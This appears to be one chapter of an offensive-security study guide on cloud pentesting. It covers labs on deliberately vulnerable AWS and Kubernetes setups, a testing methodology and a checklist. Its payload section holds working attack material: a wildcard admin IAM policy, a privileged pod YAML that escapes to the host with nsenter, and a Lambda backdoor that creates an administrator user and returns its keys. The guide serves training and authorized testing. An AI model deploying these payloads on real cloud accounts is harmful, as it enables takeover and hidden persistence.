# 06 — Cloud Security: Labs, Methodology & Payloads

---

## 🧪 Labs

### Lab 1: AWS IAM Enumeration (CloudGoat)
```bash
# CloudGoat — Vulnerable AWS environment by Rhino Security Labs
# https://github.com/RhinoSecurityLabs/cloudgoat
pip3 install cloudgoat
cloudgoat config profile  # Configure AWS profile
cloudgoat create iam_privesc_by_rollback  # Deploy vulnerable scenario

# Objective: Starting with limited IAM user → escalate to admin
# 1. aws sts get-caller-identity
# 2. aws iam list-policies → find attached policies
# 3. aws iam list-policy-versions → find older, more permissive version
# 4. aws iam set-default-policy-version → activate permissive version
# 5. Verify: aws iam list-users (should now work!)

# Cleanup
cloudgoat destroy iam_privesc_by_rollback
```

### Lab 2: S3 Bucket Hunting
```bash
# Use your own AWS account — create intentionally misconfigured buckets
# 1. Create a public bucket with sensitive data
# 2. Practice discovery and exploitation
# 3. Fix the misconfiguration

# Or use: http://flaws.cloud/ — AWS security challenge
# Or: http://flaws2.cloud/
```

### Lab 3: Kubernetes Cluster Attack (Minikube)
```bash
# Set up local cluster
minikube start

# Deploy a vulnerable application
kubectl create deployment web --image=nginx
kubectl expose deployment web --port=80

# Create an overly permissive service account
kubectl create serviceaccount overprivileged
kubectl create clusterrolebinding overprivileged-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=default:overprivileged

# Practice:
# 1. Get service account token
# 2. Use token to access API
# 3. Read all secrets
# 4. Create privileged pod
# 5. Escape to host

# Cleanup
minikube delete
```

### Lab 4: CI/CD Secret Scanning
```bash
# Clone any public repo and scan for secrets
trufflehog git https://github.com/some/repo.git
gitleaks detect --source=./repo

# Practice on: https://github.com/techgaun/github-dorks
# Or: Create a test repo, commit secrets, then scan to find them
```

### Recommended Platforms
- **flAWS** (flaws.cloud) — AWS security challenges
- **flAWS2** (flaws2.cloud) — Advanced AWS challenges
- **CloudGoat** — Deployable vulnerable AWS scenarios
- **Kubernetes Goat** — Vulnerable K8s environment
- **CI/CDon't** — CI/CD security challenges

---

## 🔴 Methodology

### Cloud Pentest Framework

```
1. SCOPE & ACCESS
   ├── What cloud provider(s)?
   ├── What credentials/roles provided?
   ├── What services are in scope?
   └── Can I create resources? (destructive?)

2. IDENTITY ENUMERATION
   ├── Who am I? (get-caller-identity / whoami)
   ├── What can I do? (enumerate permissions)
   ├── What roles exist? (list-roles)
   └── What trust relationships exist?

3. RESOURCE DISCOVERY
   ├── Compute: EC2, Lambda, ECS, Pods
   ├── Storage: S3, EBS, RDS, Secrets Manager
   ├── Network: VPCs, Security Groups, Load Balancers
   └── Management: CloudTrail, CloudWatch, Config

4. VULNERABILITY ASSESSMENT
   ├── Public S3 buckets
   ├── Overly permissive IAM
   ├── Exposed services (dashboards, APIs)
   ├── Unencrypted data
   ├── Missing logging
   └── Default configurations

5. EXPLOITATION
   ├── Privilege escalation paths
   ├── Data exfiltration
   ├── Lateral movement (cross-account, cross-service)
   └── Persistence establishment

6. REPORTING
   ├── Cloud-specific severity (public S3 = Critical)
   ├── Compliance mapping (CIS Benchmarks)
   ├── Remediation steps (IaC examples)
   └── Architecture recommendations
```

---

## 🔴 Payloads

### AWS Privilege Escalation Payloads
```json
// Admin policy document
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}

// S3 read-all policy
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "s3:*",
    "Resource": "*"
  }]
}
```

### Kubernetes Privileged Pod YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: privesc
    image: ubuntu
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
      type: Directory
```

### Lambda Backdoor (Python)
```python
import boto3
import json

def handler(event, context):
    # Exfiltrate IAM credentials
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    
    # Create backdoor user
    iam = boto3.client('iam')
    iam.create_user(UserName='backdoor')
    iam.attach_user_policy(
        UserName='backdoor',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    keys = iam.create_access_key(UserName='backdoor')
    
    return {
        'statusCode': 200,
        'body': json.dumps(keys['AccessKey'])
    }
```

---

## 📋 Cloud Security Checklist

```
AWS:
□ sts get-caller-identity
□ iam enumerate permissions
□ S3 bucket enumeration
□ Lambda function code review
□ Secrets Manager/SSM Parameter Store check
□ EC2 metadata accessible?
□ IAM privilege escalation paths checked
□ CloudTrail logging verified
□ VPC security groups reviewed

KUBERNETES:
□ API server access tested
□ Dashboard exposure checked
□ RBAC permissions audited
□ Secrets enumerated
□ Pod security standards checked
□ Network policies verified
□ Service account tokens analyzed
□ Privileged pod creation tested

CI/CD:
□ Git history scanned for secrets
□ Pipeline configuration reviewed
□ Secret management analyzed
□ Supply chain risks assessed
□ Build artifact security checked
```
